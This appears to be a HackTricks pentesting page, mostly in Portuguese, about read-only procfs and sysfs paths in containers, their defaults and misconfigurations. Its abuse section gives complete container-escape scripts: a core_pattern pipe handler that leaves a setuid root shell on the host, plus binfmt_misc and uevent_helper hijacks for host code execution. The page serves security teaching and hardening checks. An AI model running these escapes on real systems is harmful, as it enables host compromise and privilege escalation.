# Caminhos do Sistema Somente Leitura

{{#include ../../../../banners/hacktricks-training.md}}

Caminhos do sistema em somente leitura são uma proteção separada dos caminhos mascarados. Em vez de esconder um caminho completamente, o runtime o expõe mas o monta como somente leitura. Isso é comum para locais selecionados do procfs e sysfs onde o acesso de leitura pode ser aceitável ou operacionalmente necessário, mas operações de escrita seriam perigosas demais.

O objetivo é simples: muitas interfaces do kernel tornam-se muito mais perigosas quando são graváveis. Uma montagem em somente leitura não elimina todo o valor de reconhecimento, mas impede que uma workload comprometida modifique os arquivos voltados ao kernel subjacentes através desse caminho.

## Operação

Runtimes frequentemente marcam partes da visão proc/sys como somente leitura. Dependendo do runtime e do host, isso pode incluir caminhos como:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

A lista real varia, mas o modelo é o mesmo: permitir visibilidade quando necessário, negar mutação por padrão.

## Laboratório

Inspecione a lista de caminhos somente leitura declarada pelo Docker:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Inspecione a visão do proc/sys montada de dentro do container:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Impacto na Segurança

Caminhos do sistema em modo somente leitura reduzem uma grande classe de abusos que impactam o host. Mesmo quando um atacante pode inspecionar procfs ou sysfs, a incapacidade de escrever neles elimina muitos caminhos diretos de modificação que envolvem parâmetros do kernel, manipuladores de falhas (crash handlers), auxiliares de carregamento de módulos ou outras interfaces de controle. A exposição não desaparece, mas a transição de divulgação de informação para influência sobre o host fica mais difícil.

## Más configurações

Os principais erros são desmascarar ou remontar caminhos sensíveis como read-write, expor o conteúdo do host proc/sys diretamente com writable bind mounts, ou usar modos privilegiados que efetivamente contornam os defaults de runtime mais seguros. Em Kubernetes, `procMount: Unmasked` e workloads privilegiados frequentemente andam juntos com proteção de proc mais fraca. Outro erro operacional comum é assumir que, porque o runtime normalmente monta esses caminhos como read-only, todas as workloads ainda estão herdando esse padrão.

## Abuso

Se a proteção for fraca, comece procurando por entradas graváveis em proc/sys:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Quando entradas graváveis estão presentes, caminhos de acompanhamento de alto valor incluem:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
What these commands can reveal:

- Writable entries under `/proc/sys` often mean the container can modify host kernel behavior rather than merely inspect it.
- `core_pattern` is especially important because a writable host-facing value can be turned into a host code-execution path by crashing a process after setting a pipe handler.
- `modprobe` reveals the helper used by the kernel for module-loading related flows; it is a classic high-value target when writable.
- `binfmt_misc` tells you whether custom interpreter registration is possible. If registration is writable, this can become an execution primitive instead of just an information leak.
- `panic_on_oom` controls a host-wide kernel decision and can therefore turn resource exhaustion into host denial of service.
- `uevent_helper` is one of the clearest examples of a writable sysfs helper path producing host-context execution.

Interesting findings include writable host-facing proc knobs or sysfs entries that should normally have been read-only. At that point, the workload has moved from a constrained container view toward meaningful kernel influence.

### Full Example: `core_pattern` Host Escape

If `/proc/sys/kernel/core_pattern` is writable from inside the container and points to the host kernel view, it can be abused to execute a payload after a crash:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Se o caminho realmente alcança o kernel do host, a payload é executada no host e deixa um shell setuid para trás.

### Exemplo completo: Registro do `binfmt_misc`

Se `/proc/sys/fs/binfmt_misc/register` estiver gravável, um registro de interpretador personalizado pode produzir execução de código quando o arquivo correspondente for executado:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Em um `binfmt_misc` gravável voltado ao host, o resultado é execução de código no caminho do interpretador acionado pelo kernel.

### Exemplo completo: `uevent_helper`

Se `/sys/kernel/uevent_helper` estiver gravável, o kernel pode invocar um host-path helper quando um evento correspondente for acionado:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
A razão pela qual isso é tão perigoso é que o helper path é resolvido do ponto de vista do host filesystem em vez de a partir de um contexto seguro apenas do container.

## Verificações

Essas verificações determinam se a exposição de procfs/sysfs é read-only como esperado e se a workload ainda pode modificar kernel interfaces sensíveis.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
O que é interessante aqui:

- Uma carga de trabalho reforçada normalmente deve expor muito poucas entradas graváveis em /proc/sys.
- Caminhos graváveis em /proc/sys são frequentemente mais importantes do que o acesso somente leitura comum.
- Se o runtime indicar que um caminho é somente leitura mas ele for gravável na prática, reveja cuidadosamente a propagação de montagem, bind mounts e as configurações de privilégios.

## Padrões do runtime

| Runtime / platform | Estado padrão | Comportamento padrão | Enfraquecimento manual comum |
| --- | --- | --- | --- |
| Docker Engine | Habilitado por padrão | Docker define uma lista padrão de caminhos somente leitura para entradas sensíveis do proc | expondo montagens de /proc/sys do host, `--privileged` |
| Podman | Habilitado por padrão | Podman aplica caminhos padrão somente leitura a menos que explicitamente relaxado | `--security-opt unmask=ALL`, amplas montagens do host, `--privileged` |
| Kubernetes | Herda os padrões do runtime | Usa o modelo de caminhos somente leitura do runtime subjacente a menos que enfraquecido por configurações do Pod ou montagens do host | `procMount: Unmasked`, cargas de trabalho privilegiadas, montagens graváveis de /proc/sys do host |
| containerd / CRI-O sob Kubernetes | Padrão do runtime | Geralmente depende dos padrões do OCI/runtime | mesmo que a linha do Kubernetes; mudanças diretas na configuração do runtime podem enfraquecer o comportamento |

O ponto-chave é que caminhos do sistema em modo somente leitura costumam estar presentes como padrão do runtime, mas são fáceis de minar com modos privilegiados ou bind mounts do host.
{{#include ../../../../banners/hacktricks-training.md}}
